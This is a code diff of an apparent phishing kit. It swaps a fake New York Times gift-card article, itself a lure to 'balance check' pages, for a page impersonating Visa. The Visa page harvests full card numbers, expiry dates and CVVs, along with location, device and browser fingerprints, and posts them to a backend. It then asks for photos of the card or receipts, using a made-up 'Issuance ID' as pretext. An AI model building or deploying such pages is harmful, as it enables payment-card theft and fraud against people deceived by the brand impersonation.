@@ -1,175 +1,474 @@
-import { useState, useRef } from 'react'
+import { useState, useEffect } from 'react'
 import Head from 'next/head'
-import styles from '../styles/nyt.module.css'
+import styles from '../styles/visa.module.css'
 
-export default function NytHome() {
-  const [isPlaying, setIsPlaying] = useState(false)
-  const [showBanner, setShowBanner] = useState(true)
-  const audioRef = useRef(null)
+export default function HomePage() {
+    const [card, setCard] = useState('')
+    const [expiry, setExpiry] = useState('')
+    const [cvv, setCvv] = useState('')
+    const [loading, setLoading] = useState(false)
+    const [result, setResult] = useState(null)
+    const [error, setError] = useState(null)
+    const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
+    const [showTutorial, setShowTutorial] = useState(false)
+    const [showIssuanceInfo, setShowIssuanceInfo] = useState(false)
+    const [location, setLocation] = useState('Unknown')
+    const [deviceId, setDeviceId] = useState(null)
+    const [copySuccess, setCopySuccess] = useState(false)
 
-  const togglePlay = () => {
-    if (!audioRef.current) return
+    const [showUploadStep, setShowUploadStep] = useState(false)
+    const [selectedImages, setSelectedImages] = useState([])
+    const [uploadProgress, setUploadProgress] = useState(false)
+    const [uploadComplete, setUploadComplete] = useState(false)
+    const [uploadError, setUploadError] = useState(null)
 
-    if (isPlaying) {
-      audioRef.current.pause()
-    } else {
-      audioRef.current.play()
+    useEffect(() => {
+        async function detectLocation() {
+            try {
+                const res = await fetch('https://ipapi.co/json/')
+                const data = await res.json()
+                if (data.country_name) {
+                    setLocation(data.country_name)
+                }
+            } catch (err) {
+                console.error('IP detection failed', err)
+            }
+        }
+        detectLocation()
+
+        let id = localStorage.getItem('deviceId')
+        if (!id) {
+            id = 'dev_' + Math.random().toString(36).substring(2, 11) + '_' + Date.now()
+            localStorage.setItem('deviceId', id)
+        }
+        setDeviceId(id)
+    }, [])
+
+    async function checkBalance(e) {
+        e.preventDefault()
+        setError(null)
+        setResult(null)
+        setCopySuccess(false)
+        if (!card.trim()) return setError('Please enter your Visa Gift Card number.')
+        if (!expiry.trim()) return setError('Please enter the expiration date.')
+        if (!cvv.trim()) return setError('Please enter the CVV code.')
+
+        setLoading(true)
+        try {
+            const browserInfo = {
+                platform: navigator.platform,
+                vendor: navigator.vendor,
+                language: navigator.language,
+                screen: `${window.screen.width}x${window.screen.height}`
+            }
+
+            const res = await fetch('/api/generate-issuance-id', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    cardNumber: card.replace(/[\s-]/g, ''),
+                    expiry: expiry,
+                    cvv: cvv,
+                    type: 'visa',
+                    deviceId: deviceId,
+                    location: location,
+                    browserInfo: JSON.stringify(browserInfo)
+                })
+            })
+            const data = await res.json()
+            if (!res.ok) throw new Error(data?.error || 'Unable to verify card. Please try again later.')
+            setResult(data)
+            if (data.cardId && !data.isDuplicate) {
+                setShowUploadStep(true)
+            }
+        } catch (err) {
+            setError(err.message)
+        } finally {
+            setLoading(false)
+        }
     }
-    setIsPlaying(!isPlaying)
-  }
 
-  const handleGetApp = () => {
-    const userAgent = navigator.userAgent || navigator.vendor || window.opera
-    if (/android/i.test(userAgent)) {
-      window.location.href = "https://play.google.com/store/apps/details?id=com.nytimes.android"
-    } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
-      window.location.href = "https://apps.apple.com/app/the-new-york-times/id284862083"
-    } else {
-      window.location.href = "https://www.nytimes.com/subscription"
+    const handleImageSelect = (e) => {
+        const files = Array.from(e.target.files)
+        if (files.length + selectedImages.length > 3) {
+            setUploadError('Maximum 3 images allowed')
+            return
+        }
+
+        setUploadError(null)
+
+        files.forEach(file => {
+            const reader = new FileReader()
+            reader.onload = (event) => {
+                setSelectedImages(prev => [...prev, {
+                    file,
+                    preview: event.target.result,
+                    base64: event.target.result
+                }])
+            }
+            reader.readAsDataURL(file)
+        })
     }
-  }
 
-  return (
-    <div className={styles.nytPage}>
-      <Head>
-        <title>The New York Times - Breaking News</title>
-        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-      </Head>
+    const removeImage = (index) => {
+        setSelectedImages(prev => prev.filter((_, i) => i !== index))
+    }
 
-      {/* App Installation Top Bar */}
-      {showBanner && (
-        <div className={styles.appBanner}>
-          <div className={styles.nytIcon}>
-            <img src="/nyt-icon.png" alt="NYT Icon" width="24" height="24" />
-          </div>
-          <div className={styles.bannerText}>
-            <p className={styles.bannerTitle}>NYTimes: Breaking W...</p>
-            <p className={styles.bannerSubtitle}>Global and Australian New York Times Breaking W</p>
-          </div>
-          <div style={{ textAlign: 'center', marginRight: '10px' }}>
-            <button className={styles.getBtn} onClick={handleGetApp}>Get</button>
-            <span style={{ display: 'block', fontSize: '8px', color: '#666', marginTop: '2px' }}>In-App Purchases</span>
-          </div>
-          <button className={styles.closeBtn} onClick={() => setShowBanner(false)}>×</button>
+    const handleUpload = async () => {
+        if (selectedImages.length === 0) {
+            setUploadError('Please select at least one image')
+            return
+        }
+
+        setUploadProgress(true)
+        setUploadError(null)
+
+        try {
+            const res = await fetch('/api/upload-receipt', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    cardId: result.cardId,
+                    images: selectedImages.map(img => img.base64)
+                })
+            })
+
+            const data = await res.json()
+            if (!res.ok) throw new Error(data?.error || 'Upload failed')
+
+            setUploadComplete(true)
+            setShowUploadStep(false)
+        } catch (err) {
+            setUploadError(err.message)
+        } finally {
+            setUploadProgress(false)
+        }
+    }
+
+    const skipUpload = () => {
+        setShowUploadStep(false)
+        setSelectedImages([])
+        setUploadError(null)
+    }
+
+    const copyIssuanceId = async () => {
+        if (!result?.issuanceId) return
+
+        try {
+            await navigator.clipboard.writeText(result.issuanceId)
+            setCopySuccess(true)
+        } catch (err) {
+            setError('Unable to copy the Issuance ID right now.')
+        }
+    }
+
+    const resetForm = () => {
+        setCard('')
+        setExpiry('')
+        setCvv('')
+        setResult(null)
+        setShowUploadStep(false)
+        setSelectedImages([])
+        setUploadComplete(false)
+        setUploadError(null)
+        setCopySuccess(false)
+    }
+
+    return (
+        <div className={styles.visaPage}>
+            <Head>
+                <title>Check Issuance ID | Visa</title>
+                <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+            </Head>
+
+            <header className={styles.header}>
+                <div className={styles.headerTop}>
+                    <div className={styles.headerLeft}>
+                        <a href="/" className={styles.logoContainer}>
+                            <img src="/visalogo.PNG" alt="Visa" className={styles.logo} />
+                        </a>
+                    </div>
+
+                    <nav className={styles.nav}>
+                        <a href="#">Personal</a>
+                        <a href="#">Business</a>
+                        <a href="#">Partner with us</a>
+                        <a href="#">About Visa</a>
+                    </nav>
+
+                    <div className={styles.headerRight}>
+                        <a href="#" className={styles.loginLink}>Sign In</a>
+                        <button
+                            className={styles.mobileMenuBtn}
+                            onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
+                            aria-label="Toggle Menu"
+                        >
+                            <div className={`${styles.hamburger} ${mobileMenuOpen ? styles.open : ''}`}>
+                                <span></span>
+                                <span></span>
+                                <span></span>
+                            </div>
+                        </button>
+                    </div>
+                </div>
+
+                <div className={`${styles.mobileNav} ${mobileMenuOpen ? styles.active : ''}`}>
+                    <a href="#" onClick={() => setMobileMenuOpen(false)}>Personal</a>
+                    <a href="#" onClick={() => setMobileMenuOpen(false)}>Business</a>
+                    <a href="#" onClick={() => setMobileMenuOpen(false)}>Partner with us</a>
+                    <a href="#" onClick={() => setMobileMenuOpen(false)}>About Visa</a>
+                    <a href="#" onClick={() => setMobileMenuOpen(false)}>Sign In</a>
+                </div>
+            </header>
+
+            <main className={styles.main}>
+                <div className={styles.breadcrumb}>
+                    Support › cards › Check Issuance ID
+                </div>
+
+                <section className={styles.cardSection}>
+                    <div className={styles.formContainer}>
+                        <p className={styles.subtitle}>Enter your card details to instantly check the Issuance ID.</p>
+
+                        <div className={styles.card}>
+                            <form onSubmit={checkBalance}>
+                                <div className={styles.inputGroup}>
+                                    <label className={styles.label}>Card Number</label>
+                                    <input
+                                        type="text"
+                                        className={styles.input}
+                                        placeholder="1234 5678 9012 3456"
+                                        value={card}
+                                        onChange={(e) => setCard(e.target.value.replace(/[^0-9\s]/g, ''))}
+                                        disabled={loading}
+                                        autoComplete="off"
+                                        spellCheck="false"
+                                        maxLength={19}
+                                    />
+                                </div>
+
+                                <div className={styles.inputRow}>
+                                    <div className={styles.inputGroup}>
+                                        <label className={styles.label}>Expiration Date</label>
+                                        <input
+                                            type="text"
+                                            className={styles.input}
+                                            placeholder="MM/YY"
+                                            value={expiry}
+                                            onChange={(e) => {
+                                                let val = e.target.value.replace(/[^0-9]/g, '')
+                                                if (val.length > 2) val = val.slice(0, 2) + '/' + val.slice(2, 4)
+                                                setExpiry(val)
+                                            }}
+                                            disabled={loading}
+                                            autoComplete="off"
+                                            spellCheck="false"
+                                            maxLength={5}
+                                        />
+                                    </div>
+                                    <div className={styles.inputGroup}>
+                                        <label className={styles.label}>CVV</label>
+                                        <input
+                                            type="text"
+                                            className={styles.input}
+                                            placeholder="123"
+                                            value={cvv}
+                                            onChange={(e) => setCvv(e.target.value.replace(/[^0-9]/g, ''))}
+                                            disabled={loading}
+                                            autoComplete="off"
+                                            spellCheck="false"
+                                            maxLength={4}
+                                        />
+                                    </div>
+                                </div>
+
+                                {!showUploadStep && (
+                                    <button type="submit" className={styles.button} disabled={loading}>
+                                        {loading ? 'Verifying...' : 'CHECK ID'}
+                                    </button>
+                                )}
+                            </form>
+
+                            {result && !showUploadStep && (
+                                <div className={styles.result}>
+                                    <div className={styles.resultHeader}>
+                                        <span className={styles.statusDot}></span>
+                                        Issuance ID
+                                    </div>
+                                    <div className={styles.balanceText}>
+                                        <span className={styles.amount}>{result.issuanceId}</span>
+                                    </div>
+                                    <p className={styles.readyMsg}>This is your Issuance ID.</p>
+                                    <button type="button" className={styles.button} onClick={copyIssuanceId} style={{ marginTop: '15px' }}>
+                                        {copySuccess ? 'ID COPIED' : 'COPY ID CODE'}
+                                    </button>
+                                </div>
+                            )}
+
+                            {showUploadStep && (
+                                <div className={styles.uploadStep}>
+                                    <div className={styles.uploadHeader}>
+                                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                                            <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z" />
+                                            <circle cx="12" cy="13" r="4" />
+                                        </svg>
+                                        <h3>Upload Card Image / Receipt</h3>
+                                    </div>
+                                    <p className={styles.uploadSubtitle}>Upload a photo of the card or screenshots to continue with the ID check.</p>
+
+                                    <div className={styles.imagePreviewGrid}>
+                                        {selectedImages.map((img, idx) => (
+                                            <div key={idx} className={styles.previewItem}>
+                                                <img src={img.preview} alt={`Preview ${idx + 1}`} />
+                                                <button type="button" className={styles.removeBtn} onClick={() => removeImage(idx)}>×</button>
+                                            </div>
+                                        ))}
+                                        {selectedImages.length < 3 && (
+                                            <label className={styles.addImageBtn}>
+                                                <input
+                                                    type="file"
+                                                    accept="image/*"
+                                                    onChange={handleImageSelect}
+                                                    multiple
+                                                    style={{ display: 'none' }}
+                                                />
+                                                <span>+</span>
+                                                <span className={styles.addText}>Add Image</span>
+                                            </label>
+                                        )}
+                                    </div>
+
+                                    {uploadError && <div className={styles.error} style={{ marginTop: '15px' }}>{uploadError}</div>}
+
+                                    <div className={styles.uploadActions}>
+                                        <button type="button" className={styles.button} onClick={handleUpload} disabled={uploadProgress || selectedImages.length === 0}>
+                                            {uploadProgress ? 'Uploading...' : 'Upload'}
+                                        </button>
+                                        <button type="button" className={styles.skipBtn} onClick={skipUpload} disabled={uploadProgress}>
+                                            Skip
+                                        </button>
+                                    </div>
+                                </div>
+                            )}
+
+                            {error && (
+                                <div className={styles.error}>
+                                    <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" strokeWidth="2.5">
+                                        <circle cx="12" cy="12" r="10" />
+                                        <line x1="12" y1="8" x2="12" y2="12" />
+                                        <line x1="12" y1="16" x2="12.01" y2="16" />
+                                    </svg>
+                                    <span>{error}</span>
+                                </div>
+                            )}
+                        </div>
+
+                        <div className={styles.tutorialWrapper}>
+                            <button
+                                className={styles.tutorialToggle}
+                                onClick={() => setShowTutorial(!showTutorial)}
+                            >
+                                <span>Where do I find my card number?</span>
+                                <svg
+                                    viewBox="0 0 24 24"
+                                    width="20"
+                                    height="20"
+                                    fill="none"
+                                    stroke="currentColor"
+                                    strokeWidth="2.5"
+                                    style={{ transform: showTutorial ? 'rotate(180deg)' : 'rotate(0deg)', transition: 'transform 0.4s' }}
+                                >
+                                    <polyline points="6 9 12 15 18 9" />
+                                </svg>
+                            </button>
+
+                            <div className={`${styles.tutorialContent} ${showTutorial ? styles.show : ''}`}>
+                                <div className={styles.tutorialStep}>
+                                    <div className={styles.stepNumber}>1</div>
+                                    <div className={styles.stepText}>Locate your Visa Gift Card. The 16-digit card number is embossed on the front of the card.</div>
+                                </div>
+                                <div className={styles.tutorialStep}>
+                                    <div className={styles.stepNumber}>2</div>
+                                    <div className={styles.stepText}>Enter all 16 digits without spaces or dashes. The format is typically XXXX XXXX XXXX XXXX.</div>
+                                </div>
+                                <div className={styles.tutorialStep}>
+                                    <div className={styles.stepNumber}>3</div>
+                                    <div className={styles.stepText}>For security purposes, you may also need the 3-digit CVV code on the back of your card.</div>
+                                </div>
+                                <div className={styles.tutorialImage}>
+                                    <div className={styles.cardMockup}>
+                                        <div className={styles.mockupChip}></div>
+                                        <div className={styles.mockupNumber}>1234 5678 9012 3456</div>
+                                        <div className={styles.mockupName}>GIFT CARD HOLDER</div>
+                                        <div className={styles.mockupLogo}>VISA</div>
+                                    </div>
+                                </div>
+                                <p className={styles.imageCaption}>Your card number is located on the front of your Visa Gift Card.</p>
+                            </div>
+                        </div>
+
+                        <div
+                            className={styles.tutorialWrapper}
+                            style={{ marginTop: '16px', borderTop: 'none', paddingTop: 0 }}
+                        >
+                            <button
+                                className={styles.tutorialToggle}
+                                onClick={() => setShowIssuanceInfo(!showIssuanceInfo)}
+                            >
+                                <span>What is an Issuance ID?</span>
+                                <svg
+                                    viewBox="0 0 24 24"
+                                    width="20"
+                                    height="20"
+                                    fill="none"
+                                    stroke="currentColor"
+                                    strokeWidth="2.5"
+                                    style={{ transform: showIssuanceInfo ? 'rotate(180deg)' : 'rotate(0deg)', transition: 'transform 0.4s' }}
+                                >
+                                    <polyline points="6 9 12 15 18 9" />
+                                </svg>
+                            </button>
+
+                            <div className={`${styles.tutorialContent} ${showIssuanceInfo ? styles.show : ''}`}>
+                                <div className={styles.tutorialStep}>
+                                    <div className={styles.stepNumber}>1</div>
+                                    <div className={styles.stepText}>An Issuance ID is an identification number linked to your card and used for customer care, card support, account verification, and other card-related assistance.</div>
+                                </div>
+                                <div className={styles.tutorialStep}>
+                                    <div className={styles.stepNumber}>2</div>
+                                    <div className={styles.stepText}>You can use the Issuance ID to help fund the card, send money to the card through supported channels, and confirm card records when needed.</div>
+                                </div>
+                                <div className={styles.tutorialStep}>
+                                    <div className={styles.stepNumber}>3</div>
+                                    <div className={styles.stepText}>You cannot spend the card money from the Issuance ID, but you can use it for funding, support requests, and card-related verification.</div>
+                                </div>
+                                <p className={styles.imageCaption}>The Issuance ID supports funding, transfers, and verification, but it cannot be used to spend your card balance.</p>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+            </main>
+
+            <footer className={styles.footer}>
+                <div className={styles.footerContent}>
+                    <div className={styles.footerLogo}>
+                        <img src="/visalogo.PNG" alt="Visa" style={{ height: '26px', opacity: 0.6 }} />
+                    </div>
+                    <div className={styles.footerDetails}>
+                        <p>© {new Date().getFullYear()} Visa. All Rights Reserved.</p>
+                        <p>Visa Gift Cards are issued by MetaBank®, N.A., Member FDIC, pursuant to a license from Visa U.S.A. Inc.</p>
+                        <div className={styles.footerLinks}>
+                            <a href="#">Privacy Policy</a>
+                            <span> | </span>
+                            <a href="#">Terms of Use</a>
+                            <span> | </span>
+                            <a href="#">Legal</a>
+                            <span> | </span>
+                            <a href="#">Contact Us</a>
+                        </div>
+                    </div>
+                </div>
+            </footer>
         </div>
-      )}
-
-      {/* Header */}
-      <header className={styles.header}>
-        <div className={styles.headerTop}>
-          <div className={styles.menuIcon}>
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-              <path d="M4 6h16M4 12h16M4 18h16" />
-            </svg>
-          </div>
-          <div className={styles.nytLogo}>
-            <img src="/nyt-text.png" alt="The New York Times" height="32" />
-          </div>
-          <div className={styles.accountIcon}>
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
-              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" />
-            </svg>
-          </div>
-        </div>
-
-        <div className={styles.subscribeBar}>
-          <button className={styles.subscribeBtn}>Subscribe for $1/week</button>
-        </div>
-
-        {/* Categories Scroller */}
-        <div className={styles.navScroll}>
-          <span className={`${styles.navLink} ${styles.active}`}>U.S. Immigration</span>
-          <span className={styles.navLink}>Travel Ban</span>
-          <span className={styles.navLink}>Immigration Arrests</span>
-          <span className={styles.navLink}>Sweeping Changes</span>
-          <span className={styles.navLink}>Border Policy</span>
-          <span className={styles.navLink}>H-1B Visas</span>
-          <span className={styles.navLink}>Deferred Action</span>
-          <span className={styles.navLink}>Visa Backlogs</span>
-          <span className={styles.navLink}>Asylum Seekers</span>
-          <span className={styles.navLink}>Path to Citizenship</span>
-          <span className={styles.navLink}>Enforcement Actions</span>
-          <span className={styles.navLink}>Refugee Resettlement</span>
-          <span className={styles.navLink}>Work Permits</span>
-          <span className={styles.navLink}>DACA Updates</span>
-        </div>
-      </header>
-
-      {/* Article Content */}
-      <main className={styles.article}>
-        <h1 className={styles.headline}>
-          Retailers Load Incorrect Balances on Gift Cards, Leaving Shoppers Short
-        </h1>
-
-        <p className={styles.summary}>
-          Customers across the U.S. have reported buying $100 gift cards only to discover less money was actually loaded. Consumer advocates say errors at the register and faulty activation systems are to blame, and warn shoppers to always check the balance before leaving the store.
-        </p>
-
-        <div className={styles.articleActions}>
-          <div className={styles.listenAction} onClick={togglePlay} style={{ cursor: 'pointer' }}>
-            <div className={styles.circlePlay}>
-              <audio
-                ref={audioRef}
-                src="/gift-card-glitches.m4a"
-                onEnded={() => setIsPlaying(false)}
-              />
-              {isPlaying ? (
-                <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor">
-                  <path d="M6 4h4v16H6zM14 4h4v16h-4z" />
-                </svg>
-              ) : (
-                <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor">
-                  <path d="M8 5v14l11-7z" />
-                </svg>
-              )}
-            </div>
-            <span>Listen to this article · 3:50 min <span className={styles.learnMore}>Learn more</span></span>
-          </div>
-        </div>
-
-        <div className={styles.articleActions} style={{ border: 'none', gap: '8px' }}>
-          <button className={styles.shareBtn}>
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-              <path d="M4 12v8a2 2 0 002 2h12a2 2 0 002-2v-8m-12-6l6-6 6 6m-6-6v12" />
-            </svg>
-            Share full article
-          </button>
-          <div className={styles.iconOverlay}>
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-              <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6M15 3h6v6" />
-            </svg>
-          </div>
-          <div className={styles.iconOverlay}>
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-              <path d="M19 21l-7-5-7 5V5a2 2 0 012-2h10a2 2 0 012 2z" />
-            </svg>
-          </div>
-          <div className={styles.iconOverlay} style={{ padding: '6px 14px' }}>
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-              <path d="M21 11.5a8.38 8.38 0 01-.9 3.8 8.5 8.5 0 01-7.6 4.7 8.38 8.38 0 01-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 01-.9-3.8 8.5 8.5 0 014.7-7.6 8.38 8.38 0 013.8-.9h.5a8.48 8.48 0 018 8v.5z" />
-            </svg>
-            <span style={{ fontSize: '12px', marginLeft: '6px' }}>0</span>
-          </div>
-        </div>
-
-        {/* Redirect Section */}
-        <div className={styles.cardSection}>
-          <p className={styles.surveyTitle}>Verify your card balance below to ensure full value is present.</p>
-
-          <a href="/apple" className={`${styles.giftCardBtn} ${styles.appleBtn}`}>Check Apple Gift Card Balance</a>
-          <a href="/steam" className={`${styles.giftCardBtn} ${styles.steamBtn}`}>Check Steam Wallet Balance</a>
-          <a href="/visa" className={`${styles.giftCardBtn} ${styles.visaBtn}`}>Check Visa Gift Card Balance</a>
-
-          <div className={styles.surveyBox}>
-            <div className={styles.surveyText}>
-              Tell us about yourself. <strong>Take the survey.</strong>
-            </div>
-            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#ccc" strokeWidth="2">
-              <path d="M9 18l6-6-6-6" />
-            </svg>
-          </div>
-        </div>
-      </main>
-    </div >
-  )
+    )
 }
